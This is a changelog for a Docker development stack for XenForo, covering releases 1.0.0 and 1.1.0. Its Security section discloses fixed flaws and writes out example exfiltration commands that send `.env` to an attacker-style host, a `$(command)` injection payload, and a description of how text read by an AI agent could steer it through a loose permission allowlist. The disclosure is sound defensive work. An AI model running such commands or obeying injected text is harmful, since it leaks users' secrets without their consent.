# Changelog

Every change to the stack, per release. Version numbers follow [Semantic Versioning](https://semver.org/): a minor release adds or changes behaviour in a backwards-compatible way; anything that needs action on an existing stack is listed under **Action needed** and explained step by step in [docs/upgrading.md](docs/upgrading.md).

The stage after each version (Release Candidate, Stable) follows the release maturity ladder: a release is a Release Candidate for its first 30 days in public use, and becomes Stable only if no defects are reported in that time.

---

## 1.1.0 — 2026-11-12 — Release Candidate

A refresh against upstream changes since July 2026: new default versions, a PHP 8.5 build fix, unattended setup, and a Docker Engine security minimum.

### Action needed on an existing stack

**If you copied the Claude Code allowlist from `docs/ai-assisted.md` in 1.0, replace it** — it allowed `curl` in a way that let an agent send files off the machine without asking. See Security below.

Nothing else is required — an existing stack keeps working on its current data. To pick up the new defaults, follow [docs/upgrading.md](docs/upgrading.md). Two of the changes it walks through are **one-way** for an existing volume: moving Elasticsearch to a newer version, and moving MariaDB to a newer major. Both are opt-in.

### Version changes

| Component | 1.0 | 1.1 | Why |
|---|---|---|---|
| PHP (default) | 8.3 | **8.4** | 8.3 left active support in December 2025 and receives security fixes only. 8.2, 8.3 and 8.5 remain selectable with `PHP_VERSION`. |
| PHP base image | `php:<ver>-apache` (Debian follows upstream) | **`php:<ver>-apache-trixie`** | Pins the Debian release, so the OS under the image changes only when you change it. |
| Elasticsearch | 8.15.0 | **8.19.25** | 8.15 no longer receives fixes. 8.19 is the final 8.x line and is maintained. 9.x is documented as untested with XFES. |
| MariaDB | 11.4 (fixed) | **11.4** (now `MARIADB_VERSION`) | Unchanged default — 11.4 is an LTS supported to 2029. 11.8 and 12.3 (the newest LTS) are selectable. |
| Mailpit | `latest` (unpinned) | **v1.33.1** | Was the only unpinned image, against the stack's own rule. Mailpit had several 2026 security releases. |
| Xdebug | unpinned | **3.5.3** | The 3.5 line is the first with PHP 8.5 support. |
| APCu | unpinned | **5.1.28** | Reproducible builds. |
| Kibana example | 8.15.0 | 8.19.25 | Must match the Elasticsearch version exactly. |
| OpenSearch example | 2.15.0 | 3.6.0 | Current release line. |

### Condition changes (new requirements and limits)

- **Docker Engine 28.3.3 or later is now a stated requirement.** Engine 28.0 stopped other machines on the same network from reaching ports published on `127.0.0.1`; engines 28.2.0–28.3.2 reopened that after any firewalld reload (CVE-2025-54388). The stack's main security rule — every port loopback-bound — depends on it. `doctor` and `up` now print a warning on an older engine (a warning, not a failure, because Podman reports different version numbers).
- **Compose v2 or later** (current releases are v5). The previous wording, "Compose v2", read as "exactly v2".
- **PHP 8.5 now builds.** It failed in 1.0 (see Fixed).
- **macOS stock bash 3.2 is now supported and tested** (see Fixed).
- **Every service now runs with `no-new-privileges`.** Processes inside the containers can no longer gain privileges through setuid binaries. Apache and the MariaDB entrypoint still drop from root to their service user as before.

### Behaviour changes

- **`setup` runs unattended.** It now passes `--email`, `--title`, `--url` and `--skip-statistics` to `xf:install`. New `.env` keys `XF_ADMIN_EMAIL` (default `admin@example.com`) and `XF_BOARD_TITLE` (default `XenForo Dev`) feed them; an older `.env` without them uses the defaults.
- **The board URL now includes `HTTP_PORT` automatically** when it isn't 80. Before, it had to be corrected by hand in the Admin CP.
- **Anonymous usage statistics are never sent.** Before, the installer asked, and its default answer was "yes".
- **New: `xf addon rebuild Vendor/AddonId`** wraps `xf:addon-rebuild`, which re-imports an add-on's `_data/` XML without a version bump.
- **`doctor` checks the Docker Engine version first,** and checks the `dom` extension, which XenForo's installer requires and which was missing from the list.
- **`xf.ps1` accepts an absolute `XF_WEBROOT`** (`D:\xf\webroot`), as `xf.sh` already did.
- **MariaDB sets `MARIADB_AUTO_UPGRADE=1`.** If you raise `MARIADB_VERSION` on an existing volume, the image runs `mariadb-upgrade` on first start, after backing up the system tables. It does nothing while the version is unchanged.
- **Elasticsearch no longer sets a `memlock` ulimit.** It only has an effect together with `bootstrap.memory_lock=true`, which this stack does not set, so removing it changes nothing at runtime.

### Fixed

- **Most `xf.ps1` commands refused to run on a healthy stack** with "The web container is not running" — `cli`, `addon`, `import`, `export`, `rebuild`, `reindex`, `shell` and `es`. The running-check used `-notmatch` on the list of running services; on a list, PowerShell's `-notmatch` returns the entries that don't match (`elasticsearch`, `mariadb`), which counts as true whenever those services are up. It now compares each line exactly. Found during this release's end-to-end test; `xf.sh` was not affected.
- **The image failed to build on PHP 8.5** with `cp: cannot stat 'modules/*'`. OPcache is part of PHP itself from 8.5, and `docker-php-ext-install opcache` fails there. It is now only built separately on 8.4 and older.
- **`setup` could not complete without a keyboard.** `xf:install` stopped to ask for email, title, URL and statistics; with no input (CI, an AI agent, a script) it aborted.
- **`xf.sh` failed on macOS's stock bash 3.2** with `user[@]: unbound variable` the first time it ran a command as root in the container (`setup`, `xdebug on|off`). Bash older than 4.4 treats an empty array as unset under `set -u`. Verified against bash 3.2.57.
- **`xf.ps1` mishandled an absolute `XF_WEBROOT`,** joining it onto `stack\` and producing a path that does not exist.
- **The PHP minimum was stated wrongly.** The docs and Dockerfile said XenForo 2.3 requires PHP 8.1; its installer requires 7.2 (`src/XF/Install/Helper.php`). The images still cover 8.2–8.5, the maintained branches.
- **`import` and `export` were described backwards** in the README and help text. `xf import` (`xf-dev:import`) reads `_output/` development files into the database; `xf export` (`xf-addon:export`) writes the database to `_data/` XML. The troubleshooting advice "`_data` changed → `xf import`" was wrong; it is now `xf addon rebuild`.
- **Running two stacks side by side needed `COMPOSE_PROJECT_NAME`,** not only `COMPOSE_PREFIX` as documented. With the prefix alone both stacks were one Compose project and shared a database volume. The variable is now in `.env.example` and the docs explain it.
- **`.env.example` suggested `Get-Random` for secrets on Windows,** which `SECURITY.md` forbids (it is not a cryptographic generator), and its `-Count 32` form never repeated a character, which weakened it further. It now shows the `RandomNumberGenerator` method the setup script uses.
- **`PHP_TIMEZONE`** was read by the compose file but missing from `.env.example`.
- **The Windows guide's fast-filesystem advice pointed at `\\wsl$\docker-desktop-data`,** a WSL distribution current Docker Desktop no longer creates. It now describes cloning into your own WSL distribution.
- **Private vulnerability reporting was off** on the repository, although `SECURITY.md` told people to use it. It is now on.

### Security

Found by this release's security review and fixed before release. Most were already present in 1.0.

- **The documented Claude Code allowlist let an agent send files off the machine without asking** (rated Medium). `Bash(curl http://localhost*)` also matched `curl http://localhost.attacker.example/` and `curl http://localhost --data-binary @stack/.env http://elsewhere/`, so text the agent read could steer it into sending `.env` or any readable file away, or overwriting a shell profile, with no prompt. `curl` and `wget` now ask every time, and the doc explains why URL-prefix rules are not a boundary. Present since 1.0 as `curl http://localhost:*`. **If you copied the 1.0 allowlist, remove that rule.**
- **The same allowlist admitted every raw `cmd.php` command,** including `xf:addon-uninstall` and `xf-dev:export` (which overwrites `_output/`). It now allows only `xf:addon-list`, asks for the rest, and denies `xf-dev:export`.
- **The `.env` deny rules only matched `stack/.env` directly under the session's starting directory** (`./stack/.env`), so they missed the file when a session started in a parent workspace. They are now `**/stack/.env`, which matches at any depth below it.
- **`xf.sh errors <n>` could run an arbitrary command** (rated Medium). Bash evaluates a variable inside `$(( ))` as an expression, and array subscripts in it undergo command substitution, so `errors 'a[$(command)]'` ran the command. `errors` is on the documented agent allowlist, so that was command execution without a prompt. `n` must now be a number. Present since 1.0; `xf.ps1` was not affected.
- **`xf.sh` reset `.env` to your default file mode on every rewrite** — usually `644`, readable by every local account — undoing the `chmod 600` from setup. It now keeps the file at `600`.
- **Passwords no longer appear in process arguments.** The database password went on `docker compose exec` command lines (`-p…`), and the admin password was passed as `--password=…`; both were visible to any local user through `ps` while the command ran, and for the whole session with `xf db`. The database password now travels in `MYSQL_PWD`, and the admin password reaches `xf:install` on stdin. The documented `mariadb-dump` commands were changed the same way.
- **The Docker Engine version check now runs before any port is published** — at the start of `setup`, and before `compose up` in `up`. It previously ran after `up` and not at all during `setup`.
- **`reset` shows the exact directory it will delete, and refuses** one that is not a XenForo webroot (no `src/XF.php`), that contains or is inside `XF_SOURCE`, a filesystem root, your home directory, `stack/` itself, or (on Windows) a junction or symbolic link — Windows PowerShell 5.1 deletes a link's *target* when removing it recursively. On Linux/macOS it fails closed if a path cannot be resolved. Relevant because `XF_WEBROOT` may now be an absolute path on Windows.
- **Temp files from rewriting `.env` are git-ignored** (`stack/.env.*`). One is left behind if a rewrite is interrupted, and it holds the same secrets.
- **The port-exposure check now flags any non-loopback address,** not only `0.0.0.0` and `[::]` — a binding to a specific LAN address is just as reachable. CI also rejects `network_mode: host`.
- **`defaultaddon` accepts only an add-on id.** A `'` in its argument could end the PHP string it is written into in `config.php`.
- **`xf.ps1` refuses a double quote, or a trailing backslash,** in `XF_BOARD_TITLE`, `XF_ADMIN_EMAIL` or `XF_ADMIN_USER`. Windows PowerShell 5.1 would split either into extra installer arguments.
- **Mailpit pinned to v1.33.1** instead of v1.33.0; v1.33.1 limits the remote stylesheets its HTML check fetches.
- On Windows the admin password is piped with an encoding that has no byte-order mark. With Windows' "Use Unicode UTF-8 for worldwide language support" option on, Windows PowerShell 5.1 otherwise prefixes the first piped line with `EF BB BF`, so the password and its confirmation never match. Found in this release's end-to-end test.
- `xf db` now passes extra arguments to the client, so the documented `./xf.sh db -e "SELECT ..."` runs the query instead of opening a prompt.

### Documentation

- `README.md` keeps its published wording; versions, requirements and the command list were updated.
- `docs/SECURITY.md`: the incident section now matches the README (a test environment purposely exposed to the open internet); Rule 1 states the Docker Engine minimum; Rule 7 describes the monthly pin review; Rule 8 notes `no-new-privileges` is now applied; the quick audit checks the engine version.
- `docs/ai-assisted.md`: Claude Code permission rules rewritten with deny rules for destructive commands and for `stack/.env`, the current wildcard form, and native PowerShell rules.
- `docs/elasticsearch-xfes.md`: 8.19 pin, the status of 9.x with XFES, OpenSearch 3.6.
- New: [docs/upgrading.md](docs/upgrading.md) and this changelog.

### Repository

- New lint workflow on every push and pull request: shellcheck, a bash 3.2 parse, hadolint, compose validation with a loopback-only port check, a Windows PowerShell 5.1 parse, an ASCII check and PSScriptAnalyzer for `xf.ps1`, and a line-endings check.
- New monthly pin-review workflow: opens an issue listing every pinned version for a person to review. Nothing updates automatically.
- Dependabot for the GitHub Actions pins only (it cannot read image versions held in `.env` variables).
- `scripts/windows/PSScriptAnalyzerSettings.psd1`, and `*.psd1` added to `.gitattributes` (CRLF).
- Release record: [docs/releases/v1.1.0.md](docs/releases/v1.1.0.md).

---

## 1.0.0 — 2026-07-31

First public release: Apache + PHP 8.3, MariaDB 11.4, Elasticsearch 8.15.0, optional Mailpit; Linux/macOS and Windows helper scripts; security, platform, architecture, XFES and troubleshooting documentation.

The repository was not tagged at the time. `v1.0.0` refers to commit `7476fe3`, the state immediately before 1.1.0.
